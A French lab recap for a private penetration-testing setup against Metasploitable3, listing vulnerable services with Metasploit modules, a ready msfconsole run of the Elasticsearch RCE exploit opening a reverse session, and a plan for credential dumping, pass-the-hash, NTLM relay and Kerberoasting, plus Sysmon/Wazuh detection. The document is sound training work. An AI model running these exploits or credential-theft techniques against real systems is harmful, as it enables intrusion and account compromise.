# Récap du lab — état actuel & suite pour la latéralisation

**Date :** 11 octobre 2026
**Hôte :** 1 PC · 16 Go RAM · Windows · VirtualBox + Vagrant
**Objectif final :** pentest + mouvement latéral + détection (blue team)

---

## 1. Topologie actuelle

Tout est désormais sur le **même réseau host-only** `172.28.128.0/24`.

| Machine | IP | Réseau | Rôle |
|---|---|---|---|
| ub1404 (Metasploitable3 Linux) | 172.28.128.3 | host-only | Cible Linux (éteinte pour l'instant) |
| win2k8 (Metasploitable3 Windows) | 172.28.128.4 | host-only | Cible Windows |
| Kali | 172.28.128.10 (eth1) | host-only | Attaquant |
| Kali | 10.0.2.15 (eth0) | NAT | Accès Internet de Kali |

**Point important sur Kali :** deux interfaces.
- `eth0` = NAT (`10.0.2.15`) → Internet (mises à jour, outils).
- `eth1` = host-only (`172.28.128.10`) → accès aux cibles.
- Pour toute attaque, **`LHOST = 172.28.128.10`** (eth1), jamais l'adresse NAT.

---

## 2. Ce qu'on a fait

### Mise en place
- Installé Metasploitable3 (win2k8 + ub1404) via Vagrant.
- Modifié le Vagrantfile pour mettre **win2k8 en IP statique** `172.28.128.4`, sur le même
  réseau qu'ub1404 (au lieu du DHCP `192.168.56.x` d'origine).
- Installé la **VM Kali** (image VirtualBox préconstruite), 3 Go RAM, 2 adaptateurs (NAT + host-only).

### Problèmes rencontrés & résolus
- **Erreur de provisioning Vagrant** (`non-zero exit status`) : causée par la dernière ligne de
  nettoyage `rm C:\startup\*` du Vagrantfile. Les services étaient bien installés, mais le script
  a supprimé les fichiers de `C:\startup` → impossible de rejouer le provisioning ensuite.
- **Conséquence :** le **pare-feu Windows était activé mais non configuré** → tous les ports
  en `filtered` (bloqués). `configure_firewall.bat` n'avait jamais fini de s'exécuter.
- **Correction :** rejoué manuellement les règles de `configure_firewall.bat` (récupéré depuis le
  dépôt Metasploitable3) via `vagrant winrm`, en gardant le pare-feu **activé** mais en ouvrant
  les services vulnérables prévus.

### Pare-feu — état voulu (config par défaut du box)
Le box ouvre volontairement les **services web/applicatifs** et **bloque volontairement**
SMB (445), NetBIOS (139/135), RDP (3389), MySQL (3306).

> `filtered` = bloqué par le pare-feu · `closed` = autorisé mais aucun service n'écoute · `open` = accessible

### Surface d'attaque confirmée (scan Kali → win2k8)

| Port | Service / version | Vulnérabilité connue | Module Metasploit |
|---|---|---|---|
| 9200 | Elasticsearch 1.1.1 | CVE-2014-3120 (RCE MVEL) | `exploit/multi/elasticsearch/script_mvel_rce` |
| 8484 | Jenkins (Jetty winstone) | Script console → RCE Groovy | `exploit/multi/http/jenkins_script_console` |
| 8282 | Apache Tomcat/Coyote | Manager deploy / WAR RCE | `exploit/multi/http/tomcat_mgr_upload` |
| 8080 / 4848 | GlassFish 4.0 | Auth bypass → WAR deploy | `exploit/multi/http/glassfish_deployer` |
| 8585 | Apache 2.2.21 + PHP 5.3.10 | Stack WordPress / phpMyAdmin | WPScan, exploits phpMyAdmin |
| 8020 / 8383 | ManageEngine Desktop Central | File-upload RCE | `exploit/windows/http/manageengine_connectionid_write` |
| 80 | IIS 7.5 | Page d'accueil en général | — |
| 3000 / 8022 | (fermés) | Service non démarré | — |

**Première cible conseillée : Elasticsearch (9200)** — RCE la plus fiable du box, idéale pour
valider toute la chaîne attaquant → cible de bout en bout.

---

## 3. État : prêt pour l'exploitation web

La chaîne **Kali → win2k8** fonctionne (réseau OK, services énumérables). On peut lancer les
exploits web ci-dessus dès maintenant. Rappel du piège classique :

```
set LHOST 172.28.128.10    # eth1 host-only, PAS 10.0.2.15
```

---

## 4. Ce qu'il reste à faire pour la LATÉRALISATION

> **Limite actuelle :** la config par défaut du box **bloque SMB (445), NetBIOS (139/135) et
> RDP (3389)** — exactement les protocoles du mouvement latéral. PsExec, pass-the-hash, SMB relay,
> création de service distant passent tous par le **445**. Donc en l'état, win2k8 est configuré pour
> l'**exploitation web**, pas pour la latéralisation.

### Étape A — Ouvrir SMB/RDP sur les cibles Windows
Passer les 4 règles `action=block` en `action=allow` (ou les supprimer) sur win2k8, pour 445, 139,
135, 3389. Sans ça, impossible de faire du PtH / PsExec vers ce box.

### Étape B — Avoir au moins deux machines Windows
Le mouvement latéral = se déplacer **d'une machine à une autre**. Il faut donc une **seconde cible
Windows** partageant des identifiants/hash avec la première. Deux pistes (déjà dans la note de
décision d'équipe, à trancher) :
- **Lab Workgroup** : 2-3 Windows autonomes, comptes locaux à mot de passe réutilisé → PtH, relais,
  PsExec entre machines. Léger (~13 Go), rapide (~1 jour).
- **Lab Active Directory** : 1 DC (Windows Server, Server Core ~2 Go) + 1-2 membres → en plus du
  mouvement latéral : Kerberoasting, AS-REP, DCSync, délégations, BloodHound. Plus lourd (~16 Go),
  plus réaliste. C'est la **destination** visée.

### Étape C — Techniques de latéralisation à pratiquer (une fois B en place)
- **Vol d'identifiants :** Mimikatz, dump LSASS, extraction SAM/SYSTEM.
- **Pass-the-Hash :** rejeu du hash NTLM admin local d'une machine vers une autre (impacket :
  `psexec.py`, `wmiexec.py`, `smbexec.py`).
- **Relais NTLM :** `ntlmrelayx.py` + ARP spoofing (bettercap) — nécessite le **mode promiscuité
  "Allow All"** sur l'adaptateur host-only de Kali, qui est à **"Deny"** par défaut (inutile pour
  le scan/exploit, requis pour le MITM).
- **Exécution à distance :** PsExec, WMI, WinRM, tâches planifiées, création de service.
- **Réutilisation d'identifiants / password spraying** entre les machines.
- **(Si AD)** Kerberoasting, AS-REP roasting, DCSync, abus d'ACL et de délégation, BloodHound.

### Étape D — Volet détection (blue team)
- **Sysmon** sur chaque machine Windows (journalisation processus/réseau/registre).
- **SIEM : Wazuh all-in-one** (~4 Go, recommandé pour 16 Go) → boucle **attaque → log → alerte**.
- Détections clés à voir se déclencher : connexions NTLM type 3 (PtH), création de service distant
  (event 7045), artefacts PsExec, accès LSASS.

---

## 5. Rappels de persistance & RAM

- **Les règles de pare-feu appliquées manuellement ne survivent pas à un `vagrant destroy`.**
  Pour les rendre permanentes : ajouter le script en ligne `provision` dans le Vagrantfile, et
  retirer les anciennes lignes `C:\startup\*` qui échouent à chaque provisioning.
- **RAM (16 Go) :** ne pas tout allumer en même temps. Pour l'exploitation web : win2k8 + Kali
  suffisent (ub1404 éteint). Pour la latéralisation : 2 Windows + Kali ; ajouter Wazuh = juste,
  fermer le navigateur. 32 Go = confort si le projet dure.

---

## 6. Prochaine action immédiate

Lancer le premier exploit pour valider la chaîne de bout en bout :

```bash
msfconsole -q
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS 172.28.128.4
set RPORT 9200
set LHOST 172.28.128.10
run
# puis, session Meterpreter :
getuid
sysinfo
```

Ensuite : décision d'équipe sur Workgroup vs AD → on bascule sur la mise en place de la
latéralisation (étapes A → D).
